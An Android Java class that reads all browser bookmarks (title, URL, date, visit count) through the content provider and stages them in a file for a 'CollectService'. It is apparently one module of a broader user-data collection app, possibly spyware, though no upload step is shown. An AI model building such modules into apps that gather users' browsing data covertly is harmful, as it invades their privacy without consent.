package com.data.collect;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Browser;

import com.data.file.FileState;
import com.data.file.ThreadFile;
import com.data.main.CollectService;

/**
 * Created by wang on 15-1-10.
 */
public class BrowerBookmarkCollect {

    Context context;

    public BrowerBookmarkCollect(Context context) {
        this.context = context;
    }

    public String getBrowerBookmarkCollect() {
        StringBuffer sb = new StringBuffer();
        String bookmarkWhereClause = Browser.BookmarkColumns.BOOKMARK + "=1";

        ContentResolver cr = context.getContentResolver();
        Cursor bookmarkCursor = cr.query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, bookmarkWhereClause, null, null);
        while (bookmarkCursor != null && bookmarkCursor.moveToNext()) {
            sb.append(bookmarkCursor.getString(bookmarkCursor.getColumnIndex("_id")) + "-|-|" + bookmarkCursor.getString(bookmarkCursor.getColumnIndex("title")) + "-|-|" + bookmarkCursor.getString(bookmarkCursor.getColumnIndex("url")) +"-|-|"+ bookmarkCursor.getString(bookmarkCursor.getColumnIndex("date")) + "-|-|" + bookmarkCursor.getString(bookmarkCursor.getColumnIndex("visits")) + "\n");
        }
        return String.valueOf(sb);
    }

    public void getBrowerBookmarkDatas() {
        String browerBookmarkData = getBrowerBookmarkCollect();
        ThreadFile tf = new ThreadFile(browerBookmarkData, FileState.browserBookmarkFile);

        FileState fs = new FileState();
        fs.deleteBrowserBookmarkFile();
        fs.makeBrowserBookmarkFile();

        CollectService.handler.post(tf);
    }

}
